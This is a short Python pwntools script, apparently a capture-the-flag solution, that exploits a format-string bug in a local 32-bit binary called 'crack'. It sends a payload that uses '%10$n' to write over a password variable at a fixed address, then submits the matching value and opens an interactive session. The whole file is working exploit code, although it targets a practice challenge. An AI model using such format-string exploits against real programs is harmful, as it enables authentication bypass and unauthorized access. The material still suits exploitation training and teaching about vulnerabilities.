#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context(arch="i386", os = "linux", bits = 32)

p = process("crack")

password_addr = 0x804a048

p.recv()
payload  = p32(password_addr)
payload += "%10$nA"
p.send(payload)

print p.recvuntil("A")

p.recv()
p.send("4")

p.interactive()
p.close()
